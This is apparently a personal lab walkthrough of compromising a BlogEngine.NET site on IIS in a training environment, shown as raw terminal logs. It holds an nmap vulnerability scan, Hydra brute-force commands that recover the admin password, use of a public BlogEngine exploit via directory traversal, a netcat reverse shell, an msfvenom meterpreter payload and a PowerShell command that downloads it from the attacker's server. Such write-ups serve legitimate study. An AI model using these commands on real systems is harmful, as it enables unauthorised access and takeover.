┌─[✗]─[user@parrot]─[~/Desktop]
└──╼ $nmap -A --script vuln -T4 -p- -oN allports.nmap 10.10.50.232
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-12 23:45 UTC
Nmap scan report for 10.10.50.232
Host is up (0.099s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 8.5
| vulners: 
|   cpe:/a:microsoft:internet_information_services:8.5: 
|_    	CVE-2014-4078	5.1	https://vulners.com/cve/CVE-2014-4078
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.50.232
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.10.50.232:80/
|     Form id: aspnetform
|     Form action: /
|     
|     Path: http://10.10.50.232:80/archive
|     Form id: aspnetform
|     Form action: /archive
|     
|     Path: http://10.10.50.232:80/Account/login.aspx?ReturnURL=/admin/
|     Form id: form1
|     Form action: login.aspx?ReturnURL=%2fadmin%2f
|     
|     Path: http://10.10.50.232:80/category/BlogEngineNET
|     Form id: aspnetform
|     Form action: /category/BlogEngineNET
|     
|     Path: http://10.10.50.232:80/post/welcome-to-hack-park
|     Form id: aspnetform
|_    Form action: /post/welcome-to-hack-park
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Microsoft-IIS/8.5
| http-enum: 
|   /calendar/cal_search.php: ExtCalendar
|   /robots.txt: Robots file
|   /calendar/cal_cat.php: Calendarix
|   /archive/: Potentially interesting folder
|   /archives/: Potentially interesting folder
|   /author/: Potentially interesting folder
|   /contact/: Potentially interesting folder
|   /contacts/: Potentially interesting folder
|   /search/: Potentially interesting folder
|_  /search-ui/: Potentially interesting folder
3389/tcp open  ssl/ms-wbt-server?
| ssl-dh-params: 
|   VULNERABLE:
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_AES_256_GCM_SHA384
|             Modulus Type: Safe prime
|             Modulus Source: RFC2409/Oakley Group 2
|             Modulus Length: 1024
|             Generator Length: 1024
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 542.87 seconds


went to login page on target p80

attempting hydra attack because there was no lockout on guessing account logins

![[Pasted image 20250312201831.png]]

Pictured is how we got a sample post request

tried adding the LOGIN FAILED to the raw http post form request pictured on the right side of the img

└──╼ $hydra -l admin -P ~/Desktop/rockyou.txt "http-form-post://10.10.50.232/Account/login.aspx:UserName=^USER^&Password=^PASS^:failed"hydra -l admin -P ~/Desktop/rockyou.txt 10.10.50.232 http-form-post "/Account/login.aspx:__VIEWSTATE=dwWigH2HwYppps9w0yZ2d61P5tM9P%2BTi0FrSFaPkbtlV7s%2B4s%2BkMK9Kx9WcV99LBX5O2f9mVWreJGSmpXdAXXMl56oS7q0fw2HJCa%2BAOr0QwOAv9eWZT2DIJ5gJzGn3DC%2FabWQPmr%2BaZ7GRdAnSgWkJm%2BXN8F7eKQblatXMLgKi7Dns1&__EVENTVALIDATION=ROJn36R%2BB83ZdfY3SviWKc7ZPoUD4GxfbY6lJyZmMlTb%2F8m%2FGk%2FnQx7qvfoMBMbZA9K%2BkaolQRm5nSDxm2WGGWmzVC3CSEEC%2Fd%2BjNBjHiuwAMO%2BapPlLKh323oM8fjV%2BUTmRvYyPF6rldGfKDnGxItQAJGKDye1EABk871zVTq9iEEeW&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-13 00:57:57
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.50.232:80/Account/login.aspx:UserName=^USER^&Password=^PASS^:failedhydra
[80][http-post-form] host: 10.10.50.232   login: admin   password: 12345
[80][http-post-form] host: 10.10.50.232   login: admin   password: 123456789
[80][http-post-form] host: 10.10.50.232   login: admin   password: password
[80][http-post-form] host: 10.10.50.232   login: admin   password: iloveyou
[80][http-post-form] host: 10.10.50.232   login: admin   password: princess
[80][http-post-form] host: 10.10.50.232   login: admin   password: 1234567
[80][http-post-form] host: 10.10.50.232   login: admin   password: 12345678
[80][http-post-form] host: 10.10.50.232   login: admin   password: nicole
[80][http-post-form] host: 10.10.50.232   login: admin   password: babygirl
[80][http-post-form] host: 10.10.50.232   login: admin   password: monkey
[80][http-post-form] host: 10.10.50.232   login: admin   password: lovely
[80][http-post-form] host: 10.10.50.232   login: admin   password: jessica
[80][http-post-form] host: 10.10.50.232   login: admin   password: 123456
[80][http-post-form] host: 10.10.50.232   login: admin   password: rockyou
[80][http-post-form] host: 10.10.50.232   login: admin   password: abc123
[80][http-post-form] host: 10.10.50.232   login: admin   password: daniel
1 of 1 target successfully completed, 16 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-13 00:57:59
┌─[user@parrot]─[~]


unfortunately the 16 passwords hydra returned didnt get us a login

we missed the ?ReturnURL=/admin part to make it not return every attempt

┌─[user@parrot]─[~]
└──╼ $hydra -l admin -P ~/Desktop/rockyou.txt 10.10.50.232 http-form-post "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=dwWigH2HwYppps9w0yZ2d61P5tM9P%2BTi0FrSFaPkbtlV7s%2B4s%2BkMK9Kx9WcV99LBX5O2f9mVWreJGSmpXdAXXMl56oS7q0fw2HJCa%2BAOr0QwOAv9eWZT2DIJ5gJzGn3DC%2FabWQPmr%2BaZ7GRdAnSgWkJm%2BXN8F7eKQblatXMLgKi7Dns1&__EVENTVALIDATION=ROJn36R%2BB83ZdfY3SviWKc7ZPoUD4GxfbY6lJyZmMlTb%2F8m%2FGk%2FnQx7qvfoMBMbZA9K%2BkaolQRm5nSDxm2WGGWmzVC3CSEEC%2Fd%2BjNBjHiuwAMO%2BapPlLKh323oM8fjV%2BUTmRvYyPF6rldGfKDnGxItQAJGKDye1EABk871zVTq9iEEeW&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-13 01:10:51
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.50.232:80/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=dwWigH2HwYppps9w0yZ2d61P5tM9P%2BTi0FrSFaPkbtlV7s%2B4s%2BkMK9Kx9WcV99LBX5O2f9mVWreJGSmpXdAXXMl56oS7q0fw2HJCa%2BAOr0QwOAv9eWZT2DIJ5gJzGn3DC%2FabWQPmr%2BaZ7GRdAnSgWkJm%2BXN8F7eKQblatXMLgKi7Dns1&__EVENTVALIDATION=ROJn36R%2BB83ZdfY3SviWKc7ZPoUD4GxfbY6lJyZmMlTb%2F8m%2FGk%2FnQx7qvfoMBMbZA9K%2BkaolQRm5nSDxm2WGGWmzVC3CSEEC%2Fd%2BjNBjHiuwAMO%2BapPlLKh323oM8fjV%2BUTmRvYyPF6rldGfKDnGxItQAJGKDye1EABk871zVTq9iEEeW&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed
[80][http-post-form] host: 10.10.50.232   login: admin   password: 1qaz2wsx
[STATUS] 14344399.00 tries/min, 14344399 tries in 00:01h, 1 to do in 00:01h, 14 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-13 01:11:52
┌─[user@parrot]─[~]
└──╼ $

1qaz2wsx PASSWORD BANG

![[Pasted image 20250312212858.png]]

After logging in with harvested creds

3.3.6.0 blogengine has an exploit at https://www.exploit-db.com/exploits/46353

downloaded, changed local IP to match my machine

┌─[user@parrot]─[~/Desktop]
└──╼ $vim 46353.cs 

┌─[user@parrot]─[~/Desktop]
└──╼ $msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.23.80.154 LPORT=9001 -f exe > shell.exe

got tired at 10pm and logged off

picked up the next day at 8pm

this time realized I read the https://www.exploit-db.com/exploits/46353 post better and understood that I needed to change the 46353 payload to a .ascx extension and upload it to the webserver then perform a directory traversal to http://10.10.217.238?theme=../../App_Data/files to initiate my shell on the netcat listener I setup with

sudo nc -lvnp 443

I then had a reverse shell 

┌─[✗]─[user@parrot]─[~]
└──╼ $sudo nc -lvnp 443
listening on [any] 443 ...
connect to [10.23.80.154] from (UNKNOWN) [10.10.217.238] 49248
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
whoami
c:\windows\system32\inetsrv>whoami
iis apppool\blog
dir
c:\windows\system32\inetsrv>dir

we then setup an http server on our parrot with

┌─[✗]─[user@parrot]─[~]
└──╼ $python -m http.server 8181
Serving HTTP on 0.0.0.0 port 8181 (http://0.0.0.0:8181/) ...


and invoked the PS command on the webserver via the reverse shell:
powershell -c "Invoke-WebRequest -Uri 'http://10.23.80.154:8181/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'"

then started a meterpreter session in msfconsole that grabs this info

so the usual LHOST 10.10.80.154, LPORT 9001,  set PAYLOAD windows/meterpreter/reverse_tcp

┌─[user@parrot]─[~/Desktop]
└──╼ $msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.23.80.154 LPORT=9001 -f exe > shell.exe